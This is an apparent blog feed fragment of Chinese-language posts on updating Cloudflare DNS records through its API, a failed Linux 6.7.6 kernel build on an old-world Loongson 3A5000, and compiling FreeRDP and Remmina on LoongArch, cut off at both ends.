class="string">&quot;这是你获取的id&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lmark.cc&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;active&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;paused&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;full&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;development_mode&quot;</span><span class="punctuation">:</span> <span class="number">-15935750</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name_servers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;clayton.ns.cloudflare.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;sreeni.ns.cloudflare.com&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">   .....</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这是我参考的教程给的方法，然而我在写这篇文章的时候，才发现，原来域名的主页里有区域id</p><p><img src="https://cdn.lmark.cc/img/image-20240312211921352.png"></p><h3 id="获取对应子域名的id"><a href="#获取对应子域名的id" class="headerlink" title="获取对应子域名的id"></a>获取对应子域名的id</h3><p>在获取了区域id之后，使用如下命令获取子域名id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;https://api.cloudflare.com/client/v4/zones/你的区域id/dns_records?page=1&amp;per_page=20&amp;order=type&amp;direction=asc&quot;</span> -H <span class="string">&quot;Authorization: Bearer TOKEN&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span></span><br></pre></td></tr></table></figure><p>结果很多，可以粘贴出来搜索需要的内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;子域名的id&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;zone_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;你的区域id&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;zone_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lmark.cc&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;api.lmark.cc&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.1.1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;proxiable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;proxied&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ttl&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;locked&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;auto_added&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;managed_by_apps&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;managed_by_argo_tunnel&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;created_on&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-09-03T02:54:21.743348Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;modified_on&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-09-03T02:54:21.743348Z&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        .......</span><br><span class="line"> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="组装成更新请求"><a href="#组装成更新请求" class="headerlink" title="组装成更新请求"></a>组装成更新请求</h3><p>最后一步就简单了，只要把前面的区域id和子域名id组装起来，再传入你的数据就可以更新了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">curl -X PUT &quot;https://api.cloudflare.com/client/v4/zones/区域id/dns_records/子域名id&quot;  -H &quot;Authorization: Bearer TOKEN&quot; -H &quot;Content-Type: application/json&quot; --data &#x27;&#123;&quot;type&quot;:&quot;A&quot;,&quot;name&quot;:&quot;ouc.lmark.cc&quot;,&quot;content&quot;:&quot;127.0.0.1&quot;,&quot;ttl&quot;:120,&quot;proxied&quot;:false&#125;&#x27;</span><br></pre></td></tr></table></figure><p>返回结果大致如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;result&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;zone_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;zone_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lmark.cc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ouc.lmark.cc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;proxiable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;proxied&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ttl&quot;</span><span class="punctuation">:</span> <span class="number">120</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;locked&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;meta&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;auto_added&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;managed_by_apps&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;managed_by_argo_tunnel&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;created_on&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-09-03T08:06:07.802736Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;modified_on&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-03-05T17:31:41.526573Z&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;success&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;errors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;messages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="实现实验室电脑获取路由器IP并更新"><a href="#实现实验室电脑获取路由器IP并更新" class="headerlink" title="实现实验室电脑获取路由器IP并更新"></a>实现实验室电脑获取路由器IP并更新</h2><p>由于我没有路由器的访问权限，所以我的脚本只能跑在loongson电脑上，幸好学校有专门看IP的工具，直接在电脑上访问就可以获取当前路由器的IP了。脚本如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&quot;https://api.cloudflare.com/client/v4/zones/区域id/dns_records/子域名id&quot;</span>  -H <span class="string">&quot;Authorization: Bearer TOKEN&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data <span class="string">&#x27;&#123;&quot;type&quot;:&quot;A&quot;,&quot;name&quot;:&quot;loong.lmark.cc&quot;,&quot;content&quot;:&quot;&#x27;</span>$(curl -s http://ip4.ouc.edu.cn/Default2.aspx | grep -oE <span class="string">&#x27;[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+&#x27;</span>)<span class="string">&#x27;&quot;,&quot;ttl&quot;:120,&quot;proxied&quot;:false&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Cloudflare </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>一次给龙芯旧世界升级内核的失败经历</title>
      
      <link href="/archives/febc3415.html"/>
      <url>/archives/febc3415.html</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最近在捣鼓旧世界的3A5000，编了个软件，编完之后有点空虚，在到处学习一些Linux知识。然后突然想到，早在Linux5xx版本，就宣布了对Loongarch的支持，那我岂不是可以自己编一个内核，然后给Loongnix升级，于是就有了这篇。</p><h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p>源码：<a href="https://www.kernel.org/">The Linux Kernel Archives</a></p><p><img src="https://cdn.lmark.cc/img/image-20240227155337756.png"></p><p>选择6.7.6长期支持版，使用git拉取源码<a href="https://git.kernel.org/">Kernel.org git repositories</a></p><h2 id="编译："><a href="#编译：" class="headerlink" title="编译："></a>编译：</h2><h3 id="清理缓存"><a href="#清理缓存" class="headerlink" title="清理缓存"></a>清理缓存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br></pre></td></tr></table></figure><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make loongson3_defconfig <span class="comment">#使用loongarch默认配置编译</span></span><br></pre></td></tr></table></figure><p>然后报错：</p><p><img src="https://cdn.lmark.cc/img/image-20240227162658409.png"></p><p>报错原因：没有安装flex</p><p>解决方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install flex</span><br><span class="line"><span class="built_in">sudo</span> apt-get install bison</span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20240227163510201.png"></p><h3 id="将配置文件移到顶层"><a href="#将配置文件移到顶层" class="headerlink" title="将配置文件移到顶层"></a>将配置文件移到顶层</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> <span class="built_in">arch</span>/loongarch/configs/loongson3_defconfig .config</span><br></pre></td></tr></table></figure><h3 id="选择配置"><a href="#选择配置" class="headerlink" title="选择配置"></a>选择配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20240227164641246.png"></p><h3 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j4<span class="comment">#3A5000是4核8线程的</span></span><br></pre></td></tr></table></figure><p>编译完成，大概花了四十分钟：</p><p><img src="https://cdn.lmark.cc/img/image-20240227235541676.png"></p><p><img src="https://cdn.lmark.cc/img/image-20240302224926807.png"></p><h3 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo make modules_install</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20240303004420741.png"></p><h2 id="启用内核作为引导"><a href="#启用内核作为引导" class="headerlink" title="启用内核作为引导"></a>启用内核作为引导</h2><p>输入下列命令将内核作为引导，将数字更改为你自己编译的版本号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-initramfs -c -k 6.7.6</span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20240303004926192.png"></p><p>下面更新一下grub：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20240303004950924.png"></p><p>之后重启即可在启动界面选择需要启动的内核。</p><h2 id="linux6-7-6——启动"><a href="#linux6-7-6——启动" class="headerlink" title="linux6.7.6——启动"></a>linux6.7.6——启动</h2><p>关机再开机之后，在Grub引导界面，选择”advanced”选项，选择刚刚安装的6.7.6内核。</p><p>激动的心，颤抖的手，按下了回车。The world！！！！</p><p><img src="https://cdn.lmark.cc/img/5f9067e0553e9c44731fa668fa1bc1f.jpg"></p><p>一秒钟过去了。。。</p><p>两秒钟过去了。。。</p><p>三秒钟过去了。。。</p><p>咦，</p><p>怎么还在Loading initial ramdisk</p><p>……</p><p>又过了五分钟，才发现进不去了，一直卡在这。内核升级宣告失败。</p><p>后面思考了一下，发现原因可能是，Linux对loongarch的支持是基于新世界的，而旧世界不配（</p><p>关于新旧世界，参考<a href="https://areweloongyet.com/docs/old-and-new-worlds">旧世界与新世界 | 咱龙了吗？ (areweloongyet.com)</a></p><p><img src="https://cdn.lmark.cc/img/image-20240303232816720.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/harrypotterjackson/p/11846222.html">如何编译安装Linux内核 - LightningStar - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Loongarch </tag>
            
            <tag> 编译 </tag>
            
            <tag> Linux内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>在Loongarch下编译Remmina 1.4.5版本</title>
      
      <link href="/archives/bf37dab6.html"/>
      <url>/archives/bf37dab6.html</url>
      
        <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>之前一直使用loongnix作为跳板机，连接宿舍电脑，然后一直使用Remmina连接，后面看了下Remmina的版本，是1.3.3。</p><p><img src="https://cdn.lmark.cc/img/cb0a69a1e7baa9552b84e293defe6499.JPG"></p><p>最新版都已经到了1.4.5了已经，我还在用这么老的版本，太不舒服了（遂编一个试试。全程按照官方文档走，没有什么难点，浅浅记录一下。</p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install build-essential git-core libssh-dev cmake libx11-dev libxext-dev libxinerama-dev \</span><br><span class="line">  libxcursor-dev libxdamage-dev libxv-dev libxkbfile-dev libasound2-dev libcups2-dev libxml2 libxml2-dev \</span><br><span class="line">  libxrandr-dev libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev \</span><br><span class="line">  libxi-dev libavutil-dev libjson-glib-dev\</span><br><span class="line">  libavcodec-dev libxtst-dev libgtk-3-dev libgcrypt20-dev  libpulse-dev \</span><br><span class="line">  libvte-2.91-dev libxkbfile-dev libtelepathy-glib-dev libjpeg-dev \</span><br><span class="line">  libgnutls28-dev libsecret-1-dev libavahi-ui-gtk3-dev libvncserver-dev \</span><br><span class="line">  libappindicator3-dev intltool libsecret-1-dev libwebkit2gtk-4.0-dev libsystemd-dev \</span><br><span class="line">  libsodium-dev libkf5wallet-dev libusb-1.0-0-dev libpcre2-dev</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>报错：</p><p><img src="https://cdn.lmark.cc/img/QQ%E5%9B%BE%E7%89%8720240228233700.png"></p><p>解决方法：</p><p>删除libssh-4,再安装libssh-dev</p><h2 id="卸载原来的remmina"><a href="#卸载原来的remmina" class="headerlink" title="卸载原来的remmina"></a>卸载原来的remmina</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt purge &quot;remmina*&quot; &quot;libfreerdp*&quot; &quot;libwinpr*&quot; &quot;freerdp*&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20240228222842130.png"></p><h2 id="编译FreeRDP"><a href="#编译FreeRDP" class="headerlink" title="编译FreeRDP"></a>编译FreeRDP</h2><h3 id="配置FreerDP进行编译（别忘了包括-dwith-pulse-on）"><a href="#配置FreerDP进行编译（别忘了包括-dwith-pulse-on）" class="headerlink" title="配置FreerDP进行编译（别忘了包括-dwith_pulse &#x3D; on）"></a>配置FreerDP进行编译（别忘了包括-dwith_pulse &#x3D; on）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -DCMAKE_BUILD_TYPE=Debug -DWITH_SSE2=ON -DWITH_CUPS=on -DWITH_PULSE=on -DCMAKE_INSTALL_PREFIX:PATH=/opt/remmina_devel/freerdp . </span><br></pre></td></tr></table></figure><h3 id="编译FreeRDP并安装"><a href="#编译FreeRDP并安装" class="headerlink" title="编译FreeRDP并安装"></a>编译FreeRDP并安装</h3><p>开始编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; <span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure><p>报错：</p><p><img src="https://cdn.lmark.cc/img/image-20240228231231995.png"></p><p>原因：</p><p>SSE2是x86特有的，而基于Loongarch的3A5000不支持SSE2（提供了一组更高级的优化指令，用于执行单指令多数据操作。），可使用以下命令查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo</span><br></pre></td></tr></table></figure><p><img src="https://cdn.lmark.cc/img/image-20240228233318259.png"></p><p>一个X86服务器：</p><p><img src="https://cdn.lmark.cc/img/image-20240228233425578.png"></p><p>解决方法：</p><p>在CMake时将sse2选项改为off</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -DCMAKE_BUILD_TYPE=Debug -DWITH_SSE2=OFF -DWITH_CUPS=on -DWITH_PULSE=on -DCMAKE_INSTALL_PREFIX:PATH=/opt/remmina_devel/freerdp . </span><br></pre></td></tr></table></figure><p>编译完成</p><p><img src="https://cdn.lmark.cc/img/image-20240229001658718.png"></p><h3 id="使系统动态加载程序了解您安装的新库"><a href="#使系统动态加载程序了解您安装的新库" class="headerlink" title="使系统动态加载程序了解您安装的新库"></a>使系统动态加载程序了解您安装的新库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo /opt/remmina_devel/freerdp/lib | sudo tee /etc/ld.so.conf.d/freerdp_devel.conf &gt; /dev/null</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>关于这条命令：</p><blockquote><p><strong>解释：</strong></p><p>这段命令将 <code>/opt/remmina_devel/freerdp/lib</code> 目录添加到系统的动态链接器搜索路径中，并更新动态链接器缓存。</p><p><strong>详细说明：</strong></p><ul><li><p><strong>echo &#x2F;opt&#x2F;remmina_devel&#x2F;freerdp&#x2F;lib | sudo tee &#x2F;etc&#x2F;ld.so.conf.d&#x2F;freerdp_devel.conf &gt; &#x2F;dev&#x2F;null</strong></p><ul><li><code>echo</code> 命令将 <code>/opt/remmina_devel/freerdp/lib</code> 目录路径输出到标准输出。</li><li><code>sudo</code> 命令以 root 权限运行后续命令。</li><li><code>tee</code> 命令从标准输入读取数据，并将其写入指定的文件（<code>/etc/ld.so.conf.d/freerdp_devel.conf</code>）和标准输出。</li><li><code>&gt;</code> 重定向标准输出到 <code>/dev/null</code>，有效地丢弃它。</li></ul><p>此命令的结果是将 <code>/opt/remmina_devel/freerdp/lib</code> 路径添加到 <code>/etc/ld.so.conf.d/freerdp_devel.conf</code> 文件中，该文件是动态链接器搜索路径的配置文件。</p></li><li><p><strong>sudo ldconfig</strong></p><ul><li><code>ldconfig</code> 命令更新动态链接器缓存，该缓存包含已安装共享库的位置。</li><li><code>sudo</code> 命令以 root 权限运行 <code>ldconfig</code>，这是必要的，因为 <code>ldconfig</code> 需要更新系统范围的缓存。</li></ul></li></ul><p>执行此命令后，系统将能够在 <code>/opt/remmina_devel/freerdp/lib</code> 目录中找到和加载共享库。</p></blockquote><h3 id="在-usr-local-bin中创建一个指向可执行文件的符号链接"><a href="#在-usr-local-bin中创建一个指向可执行文件的符号链接" class="headerlink" title="在&#x2F;usr&#x2F;local&#x2F;bin中创建一个指向可执行文件的符号链接"></a>在&#x2F;usr&#x2F;local&#x2F;bin中创建一个指向可执行文件的符号链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /opt/remmina_devel/freerdp/bin/xfreerdp /usr/local/bin/</span><br></pre></td></tr></table></figure><h3 id="测试FreeRDP能否正常运行"><a href="#测试FreeRDP能否正常运行" class="headerlink" title="测试FreeRDP能否正常运行"></a>测试FreeRDP能否正常运行</h3><p>使用命令建立连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp +clipboard /sound:rate:44100,channel:2 /v:10.169.1.251 /u:LMark</span><br></pre></td></tr></table></figure><p>可以看到，正常打开了远程桌面</p><p><img src="https://cdn.lmark.cc/img/d8922275707cab520684c0a7e5d69cc5.JPG"></p><h2 id="编译Remmina"><a href="#编译Remmina" class="headerlink" title="编译Remmina"></a>编译Remmina</h2><h3 id="接下来拉取remmina的源码，并进行编译"><a href="#接下来拉取remmina的源码，并进行编译" class="headerlink" title="接下来拉取remmina的源码，并进行编译"></a>接下来拉取remmina的源码，并进行编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/remmina_devel</span><br><span class="line">git <span class="built_in">clone</span> https://gitlab.com/Remmina/Remmina.git</span><br></pre></td></tr></table></figure><p>配置Remmina进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Remmina</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Debug -DWITH_KF5WALLET=on -DCMAKE_INSTALL_PREFIX:PATH=/opt/remmina_devel/remmina -DCMAKE_PREFIX_PATH=/opt/remmina_devel/freerdp --build=build .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译 安装</span></span><br><span class="line">make &amp;&amp; <span class="built_in">sudo</span> make install</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>报错：<img src="https://cdn.lmark.cc/img/d6cc67fe248b73ef2cb87941687722f8.JPG"></p><p>原因：缺少CURL库</p><p>解决方法，安装<code>libcurl4-openssl-dev</code>库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install libcurl4-openssl-dev</span><br></pre></td></tr></table></figure><p>编译安装完成：<img src="https://cdn.lmark.cc/img/8432bd6f1b6664e402161a414cc1ad30.JPG"></p><h3 id="创建一个指向可执行文件的符号链接"><a href="#创建一个指向可执行文件的符号链接" class="headerlink" title="创建一个指向可执行文件的符号链接"></a>创建一个指向可执行文件的符号链接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /opt/remmina_devel/remmina/bin/remmina /usr/local/bin/ </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remmina <span class="comment">#直接运行</span></span><br></pre></td></tr></table></figure><p>报错：</p><p><img src="https://cdn.lmark.cc/img/2da2fcfda13d86d36b609f3c595b6eea.JPG"></p><p>解决方法：使用root权限运行。</p><p>成功运行，并查看当前版本，为最新的1.4.35</p><p><img src="https://cdn.lmark.cc/img/83f0d4dddee6cb9d291fa22bf470a361.JPG"></p><h2 id="创建桌面图标"><a href="#创建桌面图标" class="headerlink" title="创建桌面图标"></a>创建桌面图标</h2><p>在桌面目录下，创建<code>remmina.desktop</code>文件，并写入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Name=Remmina</span><br><span class="line">Comment=&quot;自己编的1.4.35&quot;</span><br><span class="line">Exec=/opt/remmina_devel/remmina/bin/remmina</span><br><span class="line">Icon=/home/loongson/图片/LMark.png</span><br><span class="line">Terminal=false</span><br><span class="line">Type=Application</span><br><span class="line">Categories=Network;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cdn.lmark.cc/img/1c9fadd7510d90cc0843b35690f7a4c8.JPG"></p><h2 id="制作deb包"><a href="#制作deb包" class="headerlink" 